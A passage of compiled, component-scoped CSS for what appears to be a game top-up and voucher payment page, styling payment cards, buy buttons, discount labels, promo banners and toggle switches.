        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__first--section[_ngcontent-gtc-c19]:hover+.payment-card__last--section[_ngcontent-gtc-c19] .payment-card__label--paywith[_ngcontent-gtc-c19] {
            visibility: visible;
            opacity: 1
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__first--section[_ngcontent-gtc-c19]:hover+.payment-card__last--section[_ngcontent-gtc-c19] .payment-card__buy--button[_ngcontent-gtc-c19] {
            position: relative;
            visibility: visible;
            opacity: 1
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__last--section[_ngcontent-gtc-c19] {
            position: relative;
            transition: .5s ease-in-out;
            height: 0;
            visibility: hidden;
            opacity: 0;
            cursor: pointer
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__last--section[_ngcontent-gtc-c19]:hover {
            height: 50px;
            visibility: visible;
            opacity: 1;
            border-top: 1px solid rgba(106, 112, 125, .7);
            padding-top: 11px;
            padding-bottom: 5px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__last--section[_ngcontent-gtc-c19]:hover .payment-card__label--paywith[_ngcontent-gtc-c19] {
            visibility: visible;
            opacity: 1
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__last--section[_ngcontent-gtc-c19]:hover .payment-card__buy--button[_ngcontent-gtc-c19] {
            position: relative;
            visibility: visible;
            opacity: 1
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__image[_ngcontent-gtc-c19] {
            border-radius: 4px;
            background-color: #fff;
            width: 92px;
            height: 56px;
            padding: 10px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__image[_ngcontent-gtc-c19] img[_ngcontent-gtc-c19] {
            height: 100%;
            text-align: center;
            max-width: 100%;
            -o-object-fit: contain;
            object-fit: contain
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__price[_ngcontent-gtc-c19] {
            text-align: right
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__price--discond[_ngcontent-gtc-c19] {
            display: none
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__price--label[_ngcontent-gtc-c19] {
            margin-top: 16px;
            font-family: Montserrat;
            font-size: 16px;
            font-weight: 600;
            line-height: 1.5;
            text-align: right;
            color: #fff
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__price.haveDiscount[_ngcontent-gtc-c19] {
            margin-top: 10px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__price.haveDiscount[_ngcontent-gtc-c19] .payment-card__price--discond[_ngcontent-gtc-c19] {
            display: block;
            font-size: 12px;
            color: #b4b4c0
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__price.haveDiscount[_ngcontent-gtc-c19] .payment-card__price--label[_ngcontent-gtc-c19] {
            margin-top: unset
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__label--paywith[_ngcontent-gtc-c19] {
            visibility: hidden;
            opacity: 0;
            transition: visibility 0s, opacity .5s ease-in-out;
            position: absolute;
            margin-top: 2px;
            font-family: Montserrat;
            font-size: 12px;
            line-height: 1.5;
            color: #b4b4c1
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__buy--button[_ngcontent-gtc-c19] {
            visibility: hidden;
            opacity: 0;
            transition: visibility 0s, opacity .5s ease-in-out;
            position: absolute;
            float: right;
            width: 69px;
            background-color: #d0021b;
            border-radius: 3px;
            font-family: Montserrat;
            font-size: 14px;
            font-weight: 700;
            line-height: .71;
            text-align: center;
            color: #fff;
            cursor: pointer;
            right: 0
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__buy--button[_ngcontent-gtc-c19]:hover {
            background-color: #fc0b28
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .payment-card__buy--button[_ngcontent-gtc-c19] button[_ngcontent-gtc-c19] {
            padding: 11px;
            background: 0 0;
            border: none
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] {
            border-radius: 4px;
            box-shadow: none;
            background-color: #fff;
            position: relative;
            margin-top: 30px;
            color: #69707e;
            text-align: center;
            padding: 30px 20px 25px;
            cursor: pointer;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: center;
            overflow: hidden
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] .payment-image[_ngcontent-gtc-c19] {
            height: 65px;
            text-align: center;
            max-width: 100%;
            -o-object-fit: contain;
            object-fit: contain
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19]:nth-child(2n+2) {
            margin-right: 0
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] .pos-center[_ngcontent-gtc-c19] {
            text-align: center;
            display: none
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] .pos-center[_ngcontent-gtc-c19] .btnBuy[_ngcontent-gtc-c19] {
            margin-top: 25px;
            font-size: 16px;
            color: #fff;
            background: #d0021b;
            position: relative;
            border: none;
            border-radius: 4px;
            text-transform: uppercase;
            font-family: Montserrat-Bold;
            display: block;
            padding: 15px;
            width: 100%
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] .pos-center[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            margin-top: 10px;
            font-family: Montserrat
        }

        @media (max-width:991px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] {
                margin-top: 10px;
                margin-right: 5px;
                margin-left: 5px;
                padding: 10px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19]:nth-child(2n+2) {
                margin-right: 5px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] .pos-center[_ngcontent-gtc-c19] .btnBuy[_ngcontent-gtc-c19] {
                padding: 10px;
                font-size: 11px;
                margin-top: 15px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] .pos-center[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
                margin-top: 12px;
                font-size: 11px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.current[_ngcontent-gtc-c19] {
            cursor: default
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.current[_ngcontent-gtc-c19] .pos-center[_ngcontent-gtc-c19] {
            display: block
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.noDiscount[_ngcontent-gtc-c19] .price-box[_ngcontent-gtc-c19] {
            display: block;
            width: 100%;
            padding: 0 15px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.noDiscount[_ngcontent-gtc-c19] .price-box[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            margin-top: 10px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.noDiscount[_ngcontent-gtc-c19] .price-box[_ngcontent-gtc-c19] h6[_ngcontent-gtc-c19] {
            text-decoration: line-through
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.noDiscount[_ngcontent-gtc-c19] .price-box[_ngcontent-gtc-c19] h4[_ngcontent-gtc-c19] {
            margin-top: 30px;
            text-align: center !important;
            font-family: Montserrat-Bold;
            font-size: 18px
        }

        @media (max-width:991px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.noDiscount[_ngcontent-gtc-c19] .price-box[_ngcontent-gtc-c19] {
                padding: 0
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.noDiscount[_ngcontent-gtc-c19] .price-box[_ngcontent-gtc-c19] h4[_ngcontent-gtc-c19] {
                margin-top: 15px;
                font-size: 16px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.noDiscount[_ngcontent-gtc-c19] .price-box[_ngcontent-gtc-c19] h4[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.noDiscount[_ngcontent-gtc-c19] .price-box[_ngcontent-gtc-c19] h6[_ngcontent-gtc-c19] {
            text-align: left
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.noDiscount[_ngcontent-gtc-c19] .price-box[_ngcontent-gtc-c19] .dscTitle[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.noDiscount[_ngcontent-gtc-c19] .price-box[_ngcontent-gtc-c19] h6[_ngcontent-gtc-c19] {
            display: none
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] .dscTitle[_ngcontent-gtc-c19] {
            color: #d4152c;
            margin-left: 5px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] .promo-banner[_ngcontent-gtc-c19] {
            position: absolute;
            right: -25px;
            top: 14px;
            height: 25px;
            width: 100px;
            font-size: 10px;
            color: #fff;
            font-family: Montserrat;
            text-align: center;
            background: #d0021b;
            transform: rotate(45deg)
        }

        @media (max-width:767px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] .payment-image[_ngcontent-gtc-c19] {
                max-width: 75%
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment.noDiscount[_ngcontent-gtc-c19] .price-box[_ngcontent-gtc-c19] h4[_ngcontent-gtc-c19] {
                font-size: 13px !important
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] .promo-banner[_ngcontent-gtc-c19] {
                right: -28px;
                top: 12px;
                height: 18px;
                width: 100px;
                font-size: 8px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-payment[_ngcontent-gtc-c19] .promo-banner[_ngcontent-gtc-c19] .banner-txt[_ngcontent-gtc-c19] {
            position: relative;
            top: 4px;
            padding: 1px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-voucher[_ngcontent-gtc-c19] {
            width: 100%;
            border-radius: 4px;
            box-shadow: none;
            background-color: #1d1f23;
            position: relative;
            margin-top: 10px;
            color: #fff
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-voucher[_ngcontent-gtc-c19] .switch[_ngcontent-gtc-c19] {
            position: relative;
            display: inline-block;
            width: 60px;
            height: 34px;
            float: right
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-voucher[_ngcontent-gtc-c19] .switch[_ngcontent-gtc-c19] .slider[_ngcontent-gtc-c19] {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-voucher[_ngcontent-gtc-c19] .switch[_ngcontent-gtc-c19] .slider[_ngcontent-gtc-c19]:before {
            position: absolute;
            content: "";
            height: 26px;
            width: 26px;
            left: 4px;
            bottom: 4px;
            background-color: #fff;
            transition: .4s
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-voucher[_ngcontent-gtc-c19] .switch[_ngcontent-gtc-c19] input[_ngcontent-gtc-c19]:checked+.slider[_ngcontent-gtc-c19] {
            background-image: linear-gradient(to bottom, #e93838, #900c63)
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-voucher[_ngcontent-gtc-c19] .switch[_ngcontent-gtc-c19] input[_ngcontent-gtc-c19]:focus+.slider[_ngcontent-gtc-c19] {
            box-shadow: 0 0 1px #900c63
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-voucher[_ngcontent-gtc-c19] .switch[_ngcontent-gtc-c19] input[_ngcontent-gtc-c19]:checked+.slider[_ngcontent-gtc-c19]:before {
            transform: translateX(26px)
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-voucher[_ngcontent-gtc-c19] .switch[_ngcontent-gtc-c19] .slider.round[_ngcontent-gtc-c19] {
            border-radius: 34px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-voucher[_ngcontent-gtc-c19] .switch[_ngcontent-gtc-c19] .slider.round[_ngcontent-gtc-c19]:before {
            border-radius: 50%
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .card-body-voucher[_ngcontent-gtc-c19] .switch[_ngcontent-gtc-c19] input[_ngcontent-gtc-c19] {
            opacity: 0;
            width: 0;
            height: 0
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] {
            font-size: 16px;
            font-family: Montserrat;
            color: #a6a6b2 !important;
            background-color: #1d1f23;
            margin-top: 50px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] h2[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] h4[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] ol[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            line-height: 1.5
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .gama-desc[_ngcontent-gtc-c19] {
            margin: auto;
            max-width: 1170px;
            padding: 30px 15px
        }

        @media (max-width:767px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .gama-desc[_ngcontent-gtc-c19] {
                padding: 30px 20px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .how-to[_ngcontent-gtc-c19] {
            margin: auto;
            max-width: 1170px;
            padding: 30px 15px;
            border-bottom: 1px solid rgba(123, 124, 126, .5)
        }

        @media (max-width:767px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .how-to[_ngcontent-gtc-c19] {
                padding: 15px 20px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #descWrapper.desc-max[_ngcontent-gtc-c19],
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #descWrapper.rules-max[_ngcontent-gtc-c19],
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #rulesWrapper.desc-max[_ngcontent-gtc-c19],
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #rulesWrapper.rules-max[_ngcontent-gtc-c19] {
                max-height: 45px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .how-to[_ngcontent-gtc-c19] .desc-how h2 span,
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .how-to[_ngcontent-gtc-c19] .desc-how h3 span {
            font-size: 16px;
            font-family: Montserrat;
            color: #a6a6b2 !important
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .how-to[_ngcontent-gtc-c19] .desc-how p span {
            font-size: 16px;
            font-family: Montserrat;
            color: #a6a6b2 !important
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .how-to[_ngcontent-gtc-c19] .desc-how ol {
            padding-left: 19px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .how-to[_ngcontent-gtc-c19] .desc-how ol li {
            padding-left: 10px;
            color: #a6a6b2 !important;
            font-size: 16px;
            font-family: Montserrat;
            line-height: 1.5
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .how-to[_ngcontent-gtc-c19] .desc-how ol li span {
            color: #a6a6b2 !important
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .title[_ngcontent-gtc-c19] {
            line-height: 1.5;
            max-width: 80%;
            font-size: 16px;
            font-family: Montserrat-Bold;
            color: #fff;
            margin-bottom: 10px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] {
            font-size: 16px;
            line-height: 1.5;
            color: #fff
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            display: inline-block;
            font-size: inherit;
            font-family: inherit;
            line-height: inherit;
            text-overflow: ellipsis
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] span.grayLight[_ngcontent-gtc-c19] {
            line-height: 1.5;
            font-size: 16px;
            font-family: Montserrat;
            color: #a6a6b2 !important
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] span.grayLight[_ngcontent-gtc-c19] b[_ngcontent-gtc-c19] {
            color: #fff
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] span.grayLight[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            font-size: 16px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19],
